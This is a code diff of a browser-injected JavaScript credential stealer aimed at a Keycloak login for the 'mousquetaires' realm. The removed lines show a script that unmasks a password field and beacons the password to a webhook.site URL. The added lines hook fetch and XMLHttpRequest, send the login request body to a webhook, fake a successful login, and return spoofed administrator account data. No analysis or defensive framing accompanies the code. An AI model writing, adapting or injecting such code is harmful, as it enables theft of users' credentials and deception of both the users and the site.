@@ -1,31 +1,119 @@
+console.log('%c[Interceptor] Loaded from remote 🚀', 'color: #00ff00; font-weight: bold;');
+
 (function() {
-  if (window.__vault_jok3r_loaded__) return;
-  window.__vault_jok3r_loaded__ = true;
+    // === Intercept fetch ===
+    const originalFetch = window.fetch;
 
-  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';
+    window.fetch = async function(input, init) {
+        console.log('%c[fetch] 📦 Intercepted:', 'color: #00ff00', input);
 
-  function exfiltrate(password) {
-    let i = new Image();
-    i.src = `${webhook}?password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}`;
-  }
+        const url = (typeof input === 'string') ? input : input.url;
 
-  function revealPasswordAndExfil() {
-    const eyeSpy = document.querySelector('.eye-spy');
-    const passwordInput = document.getElementById('password');
+        // ✅ Targeted POST request interception
+        if (url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
+            console.log('%c[fetch] 🎯 Intercepting login POST:', 'color: #ff0000', url);
 
-    if (!eyeSpy || !passwordInput) {
-      setTimeout(revealPasswordAndExfil, 500);
-      return;
-    }
+            if (init && init.body) {
+                console.log('%c[fetch] 🕵️‍♂️ Credentials:', 'color: #ff00ff', init.body);
+                // Optionally send to your server:
+                fetch('https://webhook.site/TON_WEBHOOK', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        endpoint: url,
+                        body: init.body
+                    })
+                });
+            }
 
-    // Simule un clic pour activer togglePasswordVisibility (utile si le comportement dépend de l'UI)
-    eyeSpy.click();
+            // Spoof response (simulate login success/failure)
+            return new Response('<h1>Connexion réussie !</h1>', {
+                status: 200,
+                headers: { 'Content-Type': 'text/html' }
+            });
+        }
 
-    // Patiente un petit peu si nécessaire
-    setTimeout(() => {
-      exfiltrate(passwordInput.value);
-    }, 200); // délai léger pour s'assurer que le champ est bien passé en clair
-  }
+        // ✅ Targeted GET request interception
+        if (url.includes('/auth/realms/mousquetaires/account')) {
+            console.log('%c[fetch] 🎯 Intercepting account GET:', 'color: #ff0000', url);
 
-  revealPasswordAndExfil();
+            const fakeData = {
+                name: "Hacked User",
+                email: "hacked@example.com",
+                role: "Administrator"
+            };
+
+            return new Response(JSON.stringify(fakeData), {
+                status: 200,
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+
+        const response = await originalFetch(input, init);
+
+        // Optional: Log actual response
+        const cloned = response.clone();
+        const text = await cloned.text();
+        console.log('%c[fetch] 🔎 Original Response:', 'color: #00ffff', text);
+
+        return response;
+    };
+
+    // === Intercept XMLHttpRequest ===
+    const origOpen = XMLHttpRequest.prototype.open;
+    const origSend = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
+        this._url = url;
+        this._method = method;
+        console.log('%c[XHR] 📡 Opened:', 'color: orange', method, url);
+        return origOpen.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function(body) {
+        console.log('%c[XHR] 🚀 Sending:', 'color: orange', this._method, this._url);
+
+        if (body) {
+            console.log('%c[XHR] 🕵️‍♂️ Body:', 'color: orange', body);
+        }
+
+        // ✅ Specific interception
+        if (this._url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
+            console.log('%c[XHR] 🎯 Blocking POST:', 'color: red');
+
+            // Exfiltrate credentials
+            fetch('https://webhook.site/TON_WEBHOOK', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    method: this._method,
+                    endpoint: this._url,
+                    body: body
+                })
+            });
+
+            // Spoof the response
+            setTimeout(() => {
+                this.readyState = 4;
+                this.status = 200;
+                this.responseText = '<h1>Connexion réussie !</h1>';
+
+                if (typeof this.onreadystatechange === 'function') {
+                    this.onreadystatechange();
+                }
+
+                if (typeof this.onload === 'function') {
+                    this.onload();
+                }
+
+                console.log('%c[XHR] 🟢 Spoofed successful login response', 'color: green');
+            }, 100);
+
+            return; // Block actual send
+        }
+
+        return origSend.apply(this, arguments);
+    };
+
+    console.log('%c[Interceptor] JS proxy loaded and running!', 'color: #00ff00; font-weight: bold;');
 })();
